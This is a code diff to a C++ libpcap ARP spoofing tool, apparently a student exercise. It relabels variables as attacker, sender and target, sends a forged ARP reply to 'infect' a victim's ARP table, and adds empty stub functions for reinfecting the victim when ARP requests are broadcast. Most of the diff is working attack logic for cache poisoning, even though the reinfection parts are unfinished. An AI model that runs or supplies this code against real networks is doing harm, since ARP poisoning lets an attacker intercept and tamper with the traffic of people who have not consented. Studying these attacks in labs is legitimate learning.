@@ -68,6 +68,21 @@ void getSenderMac(pcap_t* handle, Mac src_mac, Ip src_ip, char* dst_mac, Ip arp_
 	strcpy(dst_mac,std::string(receiveArp(handle, Ip(arp_tip), Ip(src_ip))->arp_.smac_).c_str());
 }
 
+void reinfectCase1(pcap_t* handle)
+{
+	// receiveArp(handle)
+}
+
+void reinfectCase2(pcap_t* handle)
+{
+
+}
+
+void reinfectCase3(pcap_t* handle)
+{
+
+}
+
 int main(int argc, char *argv[])
 {
 	// parameter check
@@ -84,22 +99,22 @@ int main(int argc, char *argv[])
 		char *dev = argv[1];
 		const char *interfaceName = argv[1];
 		// Collecting info for ARP packet
-		unsigned char src_mac[6];
-		if (getHostMac(interfaceName, src_mac) == 0)
+		unsigned char att_mac[6];
+		if (getHostMac(interfaceName, att_mac) == 0)
 		{
-			printf("src MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
-					src_mac[0], src_mac[1], src_mac[2],
-					src_mac[3], src_mac[4], src_mac[5]);
+			printf("attacker MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",
+					att_mac[0], att_mac[1], att_mac[2],
+					att_mac[3], att_mac[4], att_mac[5]);
 		}
 		else
 		{
 			printf("Failed to get MAC Address.\n");
 		}
 
-		char src_ip[INET_ADDRSTRLEN];
-		if (getHostIp(interfaceName, src_ip) == 0)
+		char att_ip[INET_ADDRSTRLEN];
+		if (getHostIp(interfaceName, att_ip) == 0)
 		{
-			printf("src IP : %s\n",src_ip);
+			printf("attacker IP : %s\n",att_ip);
 		}
 		else
 		{
@@ -116,14 +131,25 @@ int main(int argc, char *argv[])
 		}
 
 		// Send ARP Request packet for dst_mac(victim MAC address)
-		char dst_mac[ETH_ALEN];
-		getSenderMac(handle, Mac(src_mac), Ip(src_ip), dst_mac ,Ip(argv[iter]));
+		char send_mac[ETH_ALEN];
+		char* send_ip = argv[iter];
+		char* tar_ip = argv[iter+1];
+		getSenderMac(handle, Mac(att_mac), Ip(att_ip), send_mac ,Ip(send_ip));
 
-		printf("dst MAC : %s\n", dst_mac);
-		printf("dst IP : %s\n", argv[iter]);
+		printf("sender MAC : %s\n", send_mac);
+		printf("sender IP : %s\n", send_ip);
 
-		// Send ARP Reply packet to falsify victim(sender)'s ARP table
-		sendArp(ArpHdr::Reply, handle, Mac(dst_mac), Mac(src_mac), Mac(src_mac), Ip(argv[iter+1]), Mac(dst_mac), Ip(argv[iter]));
+		// Send ARP Reply packet to infect victim(sender)'s ARP table
+		sendArp(ArpHdr::Reply, handle, Mac(send_mac), Mac(send_mac), Mac(att_mac), Ip(tar_ip), Mac(send_mac), Ip(send_ip));
+
+
+		// Case #1 : sender broadcasts arp request packet (to get gateway's mac)
+		reinfectCase1(handle);
+		// Case #2 : gateway broadcasts arp request packet (to get sender's mac)
+		reinfectCase2(handle);
+		// Case #3 : gateway broadcasts arp request (to get david(other one)'s mac)
+		reinfectCase3(handle);
+
 
 		pcap_close(handle);
 	}
